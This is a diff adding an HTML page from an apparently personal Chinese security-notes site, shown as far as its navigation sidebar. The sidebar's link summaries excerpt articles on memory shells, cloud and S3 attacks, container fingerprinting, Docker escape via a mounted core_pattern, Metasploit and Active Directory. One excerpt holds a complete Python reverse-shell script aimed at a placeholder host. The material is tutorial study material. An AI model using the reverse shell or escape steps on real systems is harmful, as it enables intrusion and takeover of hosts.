@@ -1,0 +1,1514 @@
+<!DOCTYPE html>
+<html lang="en-US" dir="ltr">
+<head>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width">
+<title>云服务学习 | mrlxl的知识库</title>
+<script>
+  (function() {
+    const savedTheme = localStorage.getItem('theme');
+    const html = document.documentElement;
+    if (savedTheme) {
+      html.setAttribute('data-theme', savedTheme);
+    } else if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
+      html.setAttribute('data-theme', 'dark');
+    }
+  })();
+</script>
+
+      <link rel="stylesheet" href="../../../../css/main.min.1b811b24e25dcc4d4e5cab50b3b6089531edce29a8d36035967c1f4af823ee08.css" integrity="sha256-G4EbJOJdzE1OXKtQs7YIlTHtzimo02A1lnwfSvgj7gg=" crossorigin="anonymous">
+
+
+        <script src="../../../../js/main.c7c382a34629504a0438bf6064d168a2df4a02e88159bc8148fc2bd4f2e54d01.js" integrity="sha256-x8OCo0YpUEoEOL9gZNFoot9KAuiBWbyBSPwr1PLlTQE=" crossorigin="anonymous"></script>
+
+
+</head>
+<body>
+  <header>
+    <div class="header-inner">
+  
+  <div class="header-left">
+    
+    <img src="../../../../avatar.jpg" alt="Avatar" class="header-avatar">
+    
+    
+    <a href="../../../../" class="header-title">mrlxl的知识库</a>
+    
+    
+    <a href="../../../../" class="header-home-btn" title="首页">
+      <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+        <path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path>
+        <polyline points="9 22 9 12 15 12 15 22"></polyline>
+      </svg>
+    </a>
+  </div>
+
+  
+  <div class="header-right">
+    
+    <a href="https://mrlxl.cn" target="_blank" class="header-about-btn">关于我</a>
+
+    
+    <button id="mobile-search-trigger" class="mobile-search-btn">
+      <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+        <circle cx="11" cy="11" r="8"></circle>
+        <line x1="21" y1="21" x2="16.65" y2="16.65"></line>
+      </svg>
+    </button>
+
+    
+    <div class="theme-switch-wrapper">
+      <label class="theme-switch" for="checkbox">
+        <input type="checkbox" id="checkbox" />
+        <div class="slider round">
+          
+          <svg class="icon-moon" xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+          </svg>
+          
+          <svg class="icon-sun" xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <circle cx="12" cy="12" r="5"></circle>
+            <line x1="12" y1="1" x2="12" y2="3"></line>
+            <line x1="12" y1="21" x2="12" y2="23"></line>
+            <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+            <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+            <line x1="1" y1="12" x2="3" y2="12"></line>
+            <line x1="21" y1="12" x2="23" y2="12"></line>
+            <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+            <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+          </svg>
+        </div>
+      </label>
+      <script>
+        
+        (function() {
+          const html = document.documentElement;
+          const checkbox = document.getElementById('checkbox');
+          if (html.getAttribute('data-theme') === 'dark') {
+            checkbox.checked = true;
+          }
+        })();
+      </script>
+    </div>
+  </div>
+</div>
+
+  </header>
+  <main>
+    
+<div class="container">
+  <div class="sidebar-left tree">
+  <div class="search-trigger" id="search-trigger">
+    <span class="search-icon">
+      <svg width="16" height="16" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <path d="M15.5 14H14.71L14.43 13.73C15.41 12.59 16 11.11 16 9.5C16 5.91 13.09 3 9.5 3C5.91 3 3 5.91 3 9.5C3 13.09 5.91 16 9.5 16C11.11 16 12.59 15.41 13.73 14.43L14 14.71V15.5L19 20.49L20.49 19L15.5 14ZM9.5 14C7.01 14 5 11.99 5 9.5C5 7.01 7.01 5 9.5 5C11.99 5 14 7.01 14 9.5C14 11.99 11.99 14 9.5 14Z" fill="currentColor"/>
+      </svg>
+    </span>
+    <span class="search-text">搜索文章...</span>
+  </div>
+  <h3>文档</h3>
+  
+  
+
+  
+    
+
+
+
+
+  
+  
+  
+    
+  
+
+
+<ul class="tree-list">
+  
+  
+  
+    <li>
+      <span class="tree-toggle collapsed"></span>
+      <span class="section-link" style="cursor: pointer;"><strong>web安全进阶</strong></span>
+      <div class="tree-children hidden" style="display: none;">
+        
+
+
+
+
+  
+  
+  
+    
+  
+
+
+<ul class="tree-list">
+  
+    <li>
+      <div class="tree-item-wrapper">
+        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
+        <a href="../../../../blog/web%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/%E5%86%85%E5%AD%98%E9%A9%AC%E5%8E%9F%E7%90%86%E5%AE%9E%E6%88%98%E4%B8%8E%E6%9F%A5%E6%9D%80/" class="article-link" data-summary="内存马原理、实战与查杀 引言 我们在漏洞挖掘的时候经常看见大牛们发现一个文件上传漏洞时，上传的不是我们熟知的.php文件，而是.jsp文件。这其实利用的不是我们开始学的时候接触的webshell,而是memshell(内存马)。这篇文章将从基础原理开始，依次介绍Servlet内存马，Spring内存马，Agent内存马，Shiro内存马使用以及内存马的检测与查杀。
+一. Java Web 应用的三大组件 想要理解最常见的三种内存马的类型，那么一定要了解Java Web 应用的三大组件 Servlet，Filter，Listener，下面我将结合工程实例具体介绍：
+1.1 Servlet Servlet 是运行在 Web 容器中的 Java 程序，用于接收客户端请求并生成响应，是 Java Web 中处理业务逻辑的核心组件。
+结合大家都知道的当前已经成为主流的 Spring Boot 我们可能对 Servlet 感到更加熟悉一点，但是不论是 Spring MVC 还是 Spring Boot，本质上都是建立在 Servlet 规范之上的封装，它们内部都通过一个或多个 Servlet 来接收并分发 HTTP 请求。 下图是 Java Web 发展史的“标准主线” 一个 Servlet 工程 = Tomcat &#43; Servlet API &#43; 你写的 Servlet 类 &#43; 映射配置，在工程里代码层如何开发一个 Servlet 完整流程如下： Servlet 和 jsp 的关系：JSP(java servlet page) 是一种以页面为中心的 Servlet 编写方式，最终都会被编译成 Servlet 执行。 当你第一次访问一个 .jsp 文件时，Tomcat 会做这几件事：
+">内存马原理，实战与查杀</a>
+        
+      </div>
+    </li>
+  
+  
+  
+    <li>
+      <span class="tree-toggle collapsed"></span>
+      <span class="section-link" style="cursor: pointer;"><strong>API安全</strong></span>
+      <div class="tree-children hidden" style="display: none;">
+        
+
+
+
+
+  
+  
+  
+    
+  
+
+
+<ul class="tree-list">
+  
+  
+  
+</ul>
+
+      </div>
+    </li>
+  
+    <li>
+      <span class="tree-toggle collapsed"></span>
+      <span class="section-link" style="cursor: pointer;"><strong>云安全</strong></span>
+      <div class="tree-children hidden" style="display: none;">
+        
+
+
+
+
+  
+  
+  
+    
+  
+
+
+<ul class="tree-list">
+  
+    <li>
+      <div class="tree-item-wrapper">
+        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
+        <a href="../../../../blog/web%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/%E4%BA%91%E5%AE%89%E5%85%A8/%E4%BA%91%E5%8E%9F%E7%94%9F%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" class="article-link" data-summary="云原生基础知识 正式开始云原生安全的学习，首先了解一下相关的基础知识
+常见名词 记录一些常见的专业术语的意思
+容器 这玩意打CTF的应该都比较熟悉
+Docker 是一个开放源代码软件，是一个开放平台，用于开发应用、交付（shipping）应用、运行应用。Docker允许用户将基础设施（Infrastructure）中的应用单独分割出来，形成更小的颗粒（容器），从而提高交付软件的速度
+Docker 容器与虚拟机类似，但二者在原理上不同:
+容器是将操作系统层虚拟化 虚拟机是虚拟化硬件 按照上面的比较，可以知道容器能更便携高效地利用服务器
+接下来一下Docker官方给出的架构图：
+可以看见里面包括了Docker客户端、Docker容器所在宿主机、Docker镜像仓库三部分
+而宿主机包括了Docker守护进程、本地容器、本地镜像，Docker守护进程Dockerd的作用是侦听Docker API请求和管理Docker对象
+容器编排 容器编排（Container Orchestration）是指自动化容器的部署、管理、扩展和联网，容器编排可以为需要部署和管理成百上千个 Linux 容器和主机的企业提供便利
+常见的容器编排工具方案有 Kubernetes、Docker Swarm 和 Apache Mesos 等
+无服务 无服务（serverless）是一种云原生开发模型，可使开发人员专注构建和运行应用，简单来说，就是开发者不用去管服务器只负责开发就行
+无服务计算产品通常被分为两类，分别是后端即服务（BaaS）和函数即服务（FaaS），其中 FaaS 是 Serverless 的主要实现方式，FaaS 的相关产品主要有 AWS 的 Lambda、Azure 的 Functions Serverless Compute、GCP 的 Firebase Cloud Functions、阿里云的 Function Compute 等
+微服务 微服务（Microservices）是一种软件架构风格，它是以专注于单一责任与功能的小型功能区块为基础，利用模块化的方式组合出复杂的大型应用程序，各功能区块使用与语言无关的API集相互通信
+服务网格 服务网格（Service Mesh）用于控制应用的不同部分之间如何共享数据，服务网格内置于应用程序中的专用基础架构层，这个可见的基础架构层可以记录应用的不同部分是否能正常交互
+云原生安全 云原生 云 ：运行在云服务器上 原生 ：将应用运行到云上，充分的利用云自身的特点，比如弹性和分布式优势（且业务按照云来设计，而不是简单迁移） 云原生技术有利于各组织在公有云、私有云和混合云等新型动态环境中，构建和运行可弹性扩展的应用。云原生的代表技术包括容器、服务网格、微服务、不可变基础设施和声明式 API
+云原生安全 云原生安全至少包含了微服务安全、无服务安全、编排平台安全、服务网格安全、容器安全、宿主机安全等等。
+根据云原生环境的构成，面向云原生环境的安全体系可以概括为以下三个层面：
+容器安全 编排系统安全 云原生应用安全：包括了微服务、无服务、服务网格、零信任体系、API 安全等等 另外除了这些和云原生环境相关的技术之外，云原生安全还包含了一些传统安全的内容，比如宿主机的安全等等。
+">云原生基础知识</a>
+        
+      </div>
+    </li>
+  
+    <li>
+      <div class="tree-item-wrapper">
+        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
+        <a href="../../../../blog/web%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/%E4%BA%91%E5%AE%89%E5%85%A8/%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%AD%A6%E4%B9%A0/" class="article-link" data-summary="云服务学习 云服务就是云上的服务，比如从云厂商（AWS、阿里云）买来的服务
+国内云厂商：
+阿里云 腾讯云 华为云 天翼云 Ucloud 金山云 &amp;amp;hellip;&amp;amp;hellip; 国外云厂商：
+AWS GCP Azure &amp;amp;hellip;&amp;amp;hellip; 每个云厂商对云服务的叫法不同，这里以AWS的为例：
+S3对象存储（Simple Storage Service），可以简单理解为网盘，略有区别 EC2弹性计算服务（Elastic Computer Cloud），简单理解为云上的虚拟机 RDS云数据库（Relational Database Service），简单理解为云上数据库 IAM身份管理和访问管理（Identity and Access Management），简单理解为云控制台上的一套身份管理服务，可以用来管理每个子账号的权限 综上来看，其实可以简单看作一些本地的功能/服务放到了云上，那么就会产生对应的风险，值得研究
+在下文的案例图片中，笔者可能会更多用国内厂商（比如aliyun）进行举例，漏洞实例使用TerraformGoat靶场进行演示
+学习顺序参考https://wiki.teamssix.com/
+对象存储 对象存储（Object-Based Storage），也可以叫做面向对象的存储，现在也有不少厂商直接把它叫做云存储，很经典的就是Amazon S3 (Simple Storage Service) 简单存储服务，是 Amazon 的公开云存储服务，与之对应的协议被称为 S3 协议，目前 S3 协议已经被视为公认的行业标准协议，因此目前国内主流的对象存储厂商基本上都会支持 S3 协议
+Amazon S3标准中，对对象存储中可以有多个桶（Bucket），而对象（object）存放在桶里，对象包含三个key、Data、Metadata部分：
+Key指存储桶中的唯一标识符，例如一个 URL 为：https://yuy0ung.s3.ap-northeast-2.amazonaws.com/d0g3，这里的 yuy0ung 是存储桶 Bucket 的名称，/d0g3 就是 Key Data很好理解，就是存储的数据本体 Metadata意味元数据，可以简单理解为数据的标签、描述之类的信息（区别于传统的文件存储，在传统的文件存储中这类信息是直接封装在文件里的，而云上有了元数据的存在，可以大大的加快对象的排序、分类和查找） 操作使用Amazon S3的方式大致如下：
+AWS 控制台操作 AWS 命令行工具操作 AWS SDK 操作 REST API 操作，通过 REST API，可以使用 HTTP 请求创建、提取和删除存储桶和对象 接下来记录S3相关攻击手法
+">云服务学习</a>
+        
+      </div>
+    </li>
+  
+    <li>
+      <div class="tree-item-wrapper">
+        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
+        <a href="../../../../blog/web%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/%E4%BA%91%E5%AE%89%E5%85%A8/%E8%AF%86%E5%88%AB%E8%99%9A%E6%8B%9F%E6%9C%BAdocker%E5%92%8Ck8s%E9%9B%86%E7%BE%A4%E7%8E%AF%E5%A2%83/" class="article-link" data-summary="识别虚拟机、Docker和K8s集群环境 一、基础 随着云原生应用不断普及，在我们getshell之后，我们还需要判断该shell是否处于虚拟环境中，并判断该虚拟环境的类型，通常情况下，shell的虚拟环境可能有如下三个类型：
+虚拟机 虚拟机是指在一台物理服务器上运行的多个虚拟主机实例，每个虚拟主机实例都拥有自己的环境和资源，通常用于提供Web托管服务
+Docker Docker是一种虚拟化技术，利用容器化的方式将应用程序及其依赖项打包成独立、轻量级的环境，实现快速部署、高效运行和跨平台运行的功能
+K8s Kubernetes（通常简写为K8s）是一个开源的容器编排平台，通过自动化部署、扩展和管理容器化应用，实现高可用性、弹性和灵活性。它提供了集群管理、服务发现、负载均衡等功能，让用户可以更轻松地管理容器化应用的生命周期
+二、思路 如果shell处于虚拟机、Docker或K8s集群环境中，我们需要对环境进行识别，并采取针对性的措施，比如：
+虚拟机：通常考虑横向移动来扩大攻击效果
+Docker：通常先进行容器逃逸，再进行内网横向移动
+K8s：通常先尝试接管集群，以获取对容器和集群资源的完全控制
+三、识别 首先判断当前shell是否采用了虚拟化技术：
+systemd-detect-virt	#识别系统虚拟机（VM）、容器还是裸机上运行 在确认采用了虚拟化技术后，常有如下检测方法可以快速识别当前所处环境类型
+查看主机名和进程 容器的主机名默认随机生成的字符串，PID1非系统进程，可初步判断当前为容器环境
+hostname	#查看主机名 ps aux	#显示系统上所有用户的详细进程信息 通过利用cgroup信息的差异 通过查看cgroup信息，可以判断当前环是否是虚拟机、Docker容器或K8s集群:
+cat /proc/1/cgroup	#用于查看进程ID为1的系统进程（通常是Init进程）所属的cgroup信息，即用于控制和管理进程资源使用的容器技术 也可以针对性的查找关键词，例如针对Docker字符串：
+grep &amp;amp;#39;docker&amp;amp;#39; /proc/1/cgroup	#查找是否存在‘Docker’字符串 检查根目录下.dockerenv文件
+通过判断根目录下的.dockerenv文件是否存在，确认当前环是否为容器环境:
+ls -alh/dockerenv	#列出/dockerenv目录下的所有文件和目录，并显示详细信息以及人类可读的文件大小 通过检查挂载信息
+通过检查挂载信息，推测当前环境是虚拟机、Docker容器还是K8s集群:
+mount lgrep &amp;amp;#39;/type&amp;amp;#39;	#从当前系统中列出所有已挂载的文件系统，并使用grep命令筛选出包含/type路径的挂载信息 查看硬盘信息
+通过查看硬盘信息，推断当前环境是否为容器环境:
+fdisk -l #列出系统上所有磁盘的分区信息 获取当前环境的文件系统和挂载点信息
+获取当前环境的文件系统和挂载点信息，用来判断是否容器环境:
+df -h	#显示文件系统的磁盘使用情况和挂载点信息 通过了解环境变量包含的信息
+通过检查环境变量，了解特定环境的信息:
+env #显示当前系统环境中的所有环境变量 四、反制 对于防守者而言，通过了解攻击者在云原生环境中可能采取的这些信息探测行为，可以建立有效的告警机制，以便及早发现潜在的攻击行为
+">识别虚拟机、Docker和K8s集群环境</a>
+        
+      </div>
+    </li>
+  
+  
+  
+    <li>
+      <span class="tree-toggle collapsed"></span>
+      <span class="section-link" style="cursor: pointer;"><strong>docker安全</strong></span>
+      <div class="tree-children hidden" style="display: none;">
+        
+
+
+
+
+  
+  
+  
+    
+  
+
+
+<ul class="tree-list">
+  
+    <li>
+      <div class="tree-item-wrapper">
+        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
+        <a href="../../../../blog/web%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/%E4%BA%91%E5%AE%89%E5%85%A8/docker%E5%AE%89%E5%85%A8/docker%E5%AE%89%E5%85%A8%E6%A6%82%E8%A7%88/" class="article-link" data-summary="Docker安全概览 前面的文章已经简单介绍了docker容器相关概念，docker的使用对于接触过ctf出题的人来说还是相对熟悉了，这里也不做过多介绍，接下来从安全的角度来分析一下docker
+Docker面临的风险 镜像风险 镜像的内容是由用户进行配置的，所以有可能造成一些安全问题
+不安全的第三方组件 比如在镜像中引入了一些具有严重nday的组件，毫无疑问，这个镜像也就存在漏洞了
+不安全的镜像 类似供应链攻击，在公共镜像仓库比如 Docker Hub 里，会存在一些有漏洞的镜像或者恶意镜像，如果使用了这些镜像那就存在风险了
+敏感信息泄漏 如果在镜像开发完毕后没有删除自己配置的api key、AK/SK等，那么如果别人获取到该镜像就可能造成敏感信息泄漏
+活动中的容器风险 容器在运行时也有一些能够用户自定义的配置，这些配置不当同样可能造成风险
+不安全的容器应用 比如映射出来的端口的服务存在漏洞，那么自然会导致风险
+不受限制的资源共享 容器运行在宿主机上，容器必然要使用宿主机的各种 CPU、内存等资源，如果没有对容器进行资源使用限制，那么就存在宿主机被资源耗尽的风险
+不安全的配置/挂载 正常来说，容器有两大隔离机制：
+linux命名空间：实现文件系统、网络、进程、主机名等方面的隔离 linux控制组：实现CPU、内存、硬盘等方面的隔离 而配置不当会导致容器本身隔离机制失效：
+&amp;amp;ndash;privileged：使容器内的 root 权限和宿主机上的 root 权限一致，权限隔离被打破 &amp;amp;ndash;net=host：使容器与宿主机处于同一网络命名空间，网络隔离被打破 &amp;amp;ndash;pid=host：使容器与宿主机处于同一进程命令空间，进程隔离被打破 &amp;amp;ndash;volume /:/host：宿主机根目录被挂载到容器内部，文件系统隔离被打破 容器管理程序接口风险 Docker 守护进程主要监听 UNIX socket 和 TCP socket，默认情况下，Docker 只会监听 UNIX socket
+UNIX socket 风险主要在于Docker守护进程默认以宿主机的root权限运行，说到这里其实熟悉后渗透的师傅都能想到，可以利用这一点进行提权，除此之外我们还可以利用这点进行容器逃逸，这类风险有两个利用场景
+普通用户被加到Docker用户组内
+如果普通用户被加入到 Docker 用户组内，那么普通用户也将有权限访问 Docker UNIX socket，如果攻击者获得了这个普通用户权限，就可以借助 Docker 提权到 root 用户权限
+Unix socket挂载到容器内部
+有时为了实现容器内部管理容器，可能会将 Docker UNIX socket 挂载到容器内部，那么如果该容器被入侵，渗透测试人员就可以借助这个 socket 进行容器逃逸获得宿主机 root 权限
+">Docker安全概览</a>
+        
+      </div>
+    </li>
+  
+    <li>
+      <div class="tree-item-wrapper">
+        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
+        <a href="../../../../blog/web%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/%E4%BA%91%E5%AE%89%E5%85%A8/docker%E5%AE%89%E5%85%A8/docker%E9%80%83%E9%80%B8%E6%89%8B%E6%B3%95%E5%A4%A7%E5%85%A8/" class="article-link" data-summary="Docker逃逸手法大全 Docker相关安全风险更多集中在Docker逃逸方面
+和基础的后渗透思路一样，在获取docker的权限后需要对docker进行信息搜集，判断是否具有满足docker逃逸的条件
+判断是否为容器环境 在之前的文章中也提到过，可以通过查看cgroup信息等方法来判断，可以参考我的这篇笔记：快速识别虚拟主机、Docker和K8s集群环境
+不过查看cgroup目录的方法似乎只对cgroup v1有用，所以推荐使用查看根目录.dockerenv的办法：
+ls -al /.dockerenv 确认为容器环境之后，就可以查看是否具有满足逃逸的条件了，接下来从基础概念、环境搭建、信息搜集、漏洞利用等方面记录一下docker逃逸的一些tricks，当然如果比较懒，也可以试试开源的自动检测脚本：项目地址：https://github.com/teamssix/container-escape-check
+挂载宿主机procfs逃逸 基础概念 procfs（/proc）是一个伪文件系统，反映了系统内进程以及其他组件的状态，其中有很多敏感文件
+user namespace是linux的一项安全功能，允许在容器中映射和隔离用户ID
+而在容器内默认启用root权限，且默认没有开启User Namespace时，容器中的root用户与宿主机的root用户UID会一致（均为0），在这种情况下，如果将procfs挂载到不受控的容器中，则可能会导致容器逃逸，这里运用到一个tricks：
+从 2.6.19 内核版本开始，Linux 支持在 /proc/sys/kernel/core_pattern 中使用新语法。如果该文件中的首个字符是管道符 | ，那么该行的剩余内容将被当作用户空间程序或脚本解释并执行
+环境搭建 创建容器并挂载/proc目录：
+docker run -it -v /proc/sys/kernel/core_pattern:/host/proc/sys/kernel/core_pattern ubuntu 搭建完毕
+信息搜集 如果发现了两个core_pattern文件，则可能就是挂载了宿主机的procfs：
+find / -name core_pattern 漏洞利用 找到当前容器在主机下的绝对路径：
+cat /proc/mounts | xargs -d &amp;amp;#39;,&amp;amp;#39; -n 1 | grep workdir 可以看到绝对路径为/var/lib/docker/overlay2/8c1a0695756000c2afc1ba95bf605dda88027b937c937e8f2527b597447f37ac/work
+接下来安装vim和gcc：
+apt-get update -y &amp;amp;amp;&amp;amp;amp; apt-get install vim gcc -y 然后创建一个python脚本用于反弹shell：
+#!/usr/bin/python3 import os import pty import socket lhost = &amp;amp;#34;xx.xx.xx.xx&amp;amp;#34; lport = 7777 def main(): s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((lhost, lport)) os.dup2(s.fileno(), 0) os.dup2(s.fileno(), 1) os.dup2(s.fileno(), 2) os.putenv(&amp;amp;#34;HISTFILE&amp;amp;#34;, &amp;amp;#39;/dev/null&amp;amp;#39;) pty.spawn(&amp;amp;#34;/bin/bash&amp;amp;#34;) # os.remove(&amp;amp;#39;/tmp/.shell.py&amp;amp;#39;) s.close() if __name__ == &amp;amp;#34;__main__&amp;amp;#34;: main() 赋予执行权限：
+">Docker逃逸手法大全</a>
+        
+      </div>
+    </li>
+  
+  
+  
+</ul>
+
+      </div>
+    </li>
+  
+</ul>
+
+      </div>
+    </li>
+  
+    <li>
+      <span class="tree-toggle collapsed"></span>
+      <span class="section-link" style="cursor: pointer;"><strong>反序列化</strong></span>
+      <div class="tree-children hidden" style="display: none;">
+        
+
+
+
+
+  
+  
+  
+    
+  
+
+
+<ul class="tree-list">
+  
+  
+  
+</ul>
+
+      </div>
+    </li>
+  
+</ul>
+
+      </div>
+    </li>
+  
+    <li>
+      <span class="tree-toggle collapsed"></span>
+      <span class="section-link" style="cursor: pointer;"><strong>后渗透</strong></span>
+      <div class="tree-children hidden" style="display: none;">
+        
+
+
+
+
+  
+  
+  
+    
+  
+
+
+<ul class="tree-list">
+  
+  
+  
+    <li>
+      <span class="tree-toggle collapsed"></span>
+      <span class="section-link" style="cursor: pointer;"><strong>内网渗透</strong></span>
+      <div class="tree-children hidden" style="display: none;">
+        
+
+
+
+
+  
+  
+  
+    
+  
+
+
+<ul class="tree-list">
+  
+    <li>
+      <div class="tree-item-wrapper">
+        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
+        <a href="../../../../blog/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/msfcs%E4%BB%8B%E7%BB%8D%E4%B8%8E%E4%BD%BF%E7%94%A8/" class="article-link" data-summary="MSF&amp;amp;amp;CS介绍与使用 免责声明：本文所有内容仅供学习交流，请勿用于违法活动
+Metasploit Framework（MSF） Metasploit是ruby语言开发的一个基于命令行操作的渗透测试框架，我们可以查找，利用和验证漏洞，附带数千个已知的软件漏洞，并保持持续更新。Metasploit可以用来信息收集、漏洞探测、漏洞利用等渗透测试的全流程
+一、msf体系框架 msf的整体框架如下：
+我们重点关注模块部分
+模块组织按照不同的用途分为7种类型的模块（Modules）：
+辅助模块（Aux)：负责信息收集、扫描、嗅探、指纹识别、口令猜测和Dos攻击等功能 渗透攻击模块（Exploits)：利用系统漏洞进行攻击，里面有每一个具体漏洞的攻击方法 后渗透攻击模块（Post)：在取得目标系统远程控制权限后，进行一系列的后渗透攻击动作，如获取敏感信息、跳板攻击等操作 攻击载荷模块（payloads)：成功exploit之后，真正在目标系统执行的代码或指令 编码器模块（Encoders)：主要对payload进行加密，最终达到躲避AntiVirus检查的目的 空指令模块（Nops)：主要作用是提高payload稳定性及维持大小 免杀模块(Evasion)：可以用来创建木马文件 二、Metasploit基本使用 kali中自带了msf，可以直接使用
+Metasploit启动 msf有一个用于存储信息收集数据的关系型数据库Postgresql，可以自主选择是否开启
+msf有三种启动方式：
+先启动Postgresql数据库，再启动Metasploit
+service postgresql start msfconsole 不启动数据库，直接启动Metasploit
+msfconsole 启动Postgresql的同时启动Metasploit
+msfdb run 也可以直接在kali左上角工具点击启动，实际上是自动执行了命令：
+sudo msfdb init &amp;amp;amp;&amp;amp;amp; msfconsole 由于Postgresql数据库的默认端口为5432，所以可以查看该端口来判断是否开启Postgresql数据库：
+netstat -pantu | grep 5432 Metasploit常用命令 在msfconsole中，输入help可以看见各种命令的介绍
+show展示 用于展示可用模块，有效参数是：all，encoders，nops，exploits，payloads，auxiliary, post，plugins，info，options
+展示模块时，每个模块都会有一个名为Rank的字段，该列代表该模块的可靠性
+Rank 的值可以是下面的表格中的其中之一，按照可靠性降序排列
+Ranking Description ExcellentRanking 漏洞利用程序绝对不会使目标服务崩溃，就像 SQL 注入，命令执行，远程文件包含，本地文件包含等等。除非有特殊情况，典型的内存破坏利用程序不可以被评估为该级别。（WMF Escape()） GreatRanking 该漏洞利用程序有一个默认的目标系统，并且可以自动检测适当的目标系统，或者在目标服务的版本检查之后可以返回到一个特定于应用的返回地址。（译者注：有些二进制的漏洞利用成功后，需要特别设置 Shell 退出后的返回地址，否则当 Shell 结束后，目标服务器会崩溃掉。） GoodRanking 该漏洞利用程序有一个默认目标系统，并且是这种类型软件的“常见情况”（英文，桌面应用程序的Windows 7，服务器的2012等常用） NormalRanking 该漏洞利用程序是可靠的，但是依赖于特定的版本，并且不能或者不能可靠地自动检测。 AverageRanking 该漏洞利用程序不可靠或者难以利用。 LowRanking 对于通用的平台而言，该漏洞利用程序几乎不能利用（或者低于 50% 的利用成功率） ManualRanking 该漏洞利用程序不稳定或者难以利用并且基于拒绝服务（DOS）。如果一个模块只有在用户特别配置该模块的时候才会被用到，否则该模块不会被使用到，那么也可以评为该等级。（例如：exploit/unix/webapp/php_eval） search搜索 已知一个漏洞，我想知道Metasploit里面是否有相关的模块，就可以用search进行搜索
+">MSF&amp;CS介绍与使用</a>
+        
+      </div>
+    </li>
+  
+    <li>
+      <div class="tree-item-wrapper">
+        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
+        <a href="../../../../blog/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" class="article-link" data-summary="内网渗透-AD域基础知识 简介 内网也指局域网，是一个封闭的网络空间
+内网渗透（intranet exploitation）是对目标服务器getshell后，通过一系列技术手段对其所处的内网环境进行渗透，最终获取内网其他主机的权限的过程，这些通常涉及以下技术：
+内网信息收集 内网代理 权限提升 横向移动 &amp;amp;hellip;&amp;amp;hellip; 基本概念 工作组（work group） 分辨：在命令提示符界面执行systeminfo，回显结果的“域”信息为WORKGROUP
+简单来说，就是将不同的计算机按照功能或部门分别置于不同的组，适用于网络中计算机不多、资产规模较小、对安全管理控制要求不严格的情况，这是一种松散的资源管理模式，任何人都可以在局域网中创建新的工作任务而无需管理员同意，换言之，处于同一工作组中的主机彼此间地位平等，不存在额外关联或管理关系，对于此类情况，在内网渗透时需要逐个渗透与控制
+在局域网内，计算机默认都是按照工作组的方式进行资源管理的
+优点： 方便管理和维护 资源分配方便和灵活 缺点： 缺乏集中管理与控制的机制 没有集中的统一账户管理 只适合小规模用户的使用 域（domain） 分辨：在命令提示符界面执行systeminfo，回显结果的“域”信息为类似域名格式，由“.”连接的字符串
+当组织中网络规模越来越大时，需要统一的管理和集中的身份验证，并能为用户提供更加方便地的网络资源搜索和使用方式时，就需要放弃工作组而使用域
+域是一种比工作组更高级的的计算机资源管理模式，在域环境中，所有用户账户、用户组、计算机、打印机和其他安全主体都在一个或多个域控制器的中央数据库中注册；当域用户想访问域中的资源时，必须通过域控制器集中进行身份验证，通过身份验证的域用户在域中的身份决定了域用户对域中资源的访问权限
+在域环境中，域管理员用户在域中具有最高访问权限和最高管理权限，在渗透过程中，获取域管理员相关权限往往可以控制整个域控
+单域
+指网络环境中只有一个域
+父域和子域
+某些情况下，需要在一个域中分出多个域，被划分的域称为父域，划分出来的域被称为子域，每个子域都拥有自己的安全策略，在有信任的情况下，父域可以访问子域
+从域名上看，子域是域名中的一个段，用“.”进行域名分割，一个“.”代表域名的一个层级
+域树
+域树是多个域通过建立信任关系组成的一个域集合
+在域树中，所有的域共享同一表结构和配置，所有域名形成一个连续的名字空间，该命名空间具有连续性，域名层次越深，级别越低
+在域树中，域管理员只能管理本域，不能访问或管理其他域，如果两个域之间要互相访问，就需要建立信任关系（trust relation）
+域林
+指由一个或多个没有形成连续名字空间的域树通过建立信任关系组成的域树集合，域林中所有域树共享同一个表结构、配置和全局目录
